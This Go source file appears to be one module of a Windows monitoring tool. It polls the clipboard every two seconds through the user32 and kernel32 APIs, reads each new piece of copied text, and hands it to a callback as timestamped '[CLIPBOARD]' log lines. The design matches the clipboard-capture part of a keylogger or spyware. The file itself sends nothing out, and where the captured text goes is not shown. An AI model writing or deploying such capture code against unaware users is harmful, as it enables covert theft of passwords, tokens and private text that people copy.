package monitor

import (
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

// clipboardMonitor tracks clipboard changes and captures text content.
type clipboardMonitor struct {
	lastContent string
	mu          sync.Mutex
	callback    func(string)
}

var (
	procOpenClipboard    = user32.NewProc("OpenClipboard")
	procCloseClipboard   = user32.NewProc("CloseClipboard")
	procGetClipboardData = user32.NewProc("GetClipboardData")
	procGetClipSeqNum    = user32.NewProc("GetClipboardSequenceNumber")

	procGlobalLock   = kernel32.NewProc("GlobalLock")
	procGlobalUnlock = kernel32.NewProc("GlobalUnlock")
)

const (
	cfUnicodeText = 13 // CF_UNICODETEXT
)

// newClipboardMonitor creates a new clipboard monitoring instance.
func newClipboardMonitor(callback func(string)) *clipboardMonitor {
	return &clipboardMonitor{
		callback: callback,
	}
}

// start begins polling the clipboard for changes.
// Uses GetClipboardSequenceNumber for efficient change detection.
func (cm *clipboardMonitor) start() {
	var lastSeqNum uint32

	for {
		time.Sleep(2 * time.Second)

		// Check if clipboard content changed via sequence number (cheap check).
		seqNum, _, _ := procGetClipSeqNum.Call()
		currentSeq := uint32(seqNum)
		if currentSeq == lastSeqNum {
			continue
		}
		lastSeqNum = currentSeq

		// Clipboard changed — read text content.
		text := cm.readClipboardText()
		if text == "" {
			continue
		}

		// Deduplicate: skip if same content as last capture.
		cm.mu.Lock()
		if text == cm.lastContent {
			cm.mu.Unlock()
			continue
		}
		cm.lastContent = text
		cm.mu.Unlock()

		// Truncate very long clipboard content (max 2000 chars).
		if len(text) > 2000 {
			text = text[:2000] + "... [TRUNCATED]"
		}

		// Sanitize: collapse excessive whitespace.
		text = strings.TrimSpace(text)
		if text == "" {
			continue
		}

		ts := time.Now().Format("2006-01-02 15:04:05")
		logLine := fmt.Sprintf("[%s] [CLIPBOARD] %s", ts, text)

		if cm.callback != nil {
			cm.callback(logLine)
		}
	}
}

// readClipboardText opens the clipboard and reads CF_UNICODETEXT data.
func (cm *clipboardMonitor) readClipboardText() string {
	// OpenClipboard(NULL) — associate with current task.
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return ""
	}
	defer procCloseClipboard.Call()

	// GetClipboardData(CF_UNICODETEXT)
	hData, _, _ := procGetClipboardData.Call(cfUnicodeText)
	if hData == 0 {
		return ""
	}

	// GlobalLock to get pointer to the clipboard data.
	ptr, _, _ := procGlobalLock.Call(hData)
	if ptr == 0 {
		return ""
	}
	defer procGlobalUnlock.Call(hData)

	// Read UTF-16 string from the pointer.
	text := readUTF16String(ptr)
	return text
}

// readUTF16String reads a null-terminated UTF-16 string from a memory pointer.
func readUTF16String(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}

	// Read up to 4096 uint16 characters.
	const maxChars = 4096
	var buf [maxChars]uint16
	for i := 0; i < maxChars; i++ {
		ch := *(*uint16)(unsafe.Pointer(ptr + uintptr(i)*2))
		if ch == 0 {
			break
		}
		buf[i] = ch
	}

	return syscall.UTF16ToString(buf[:])
}
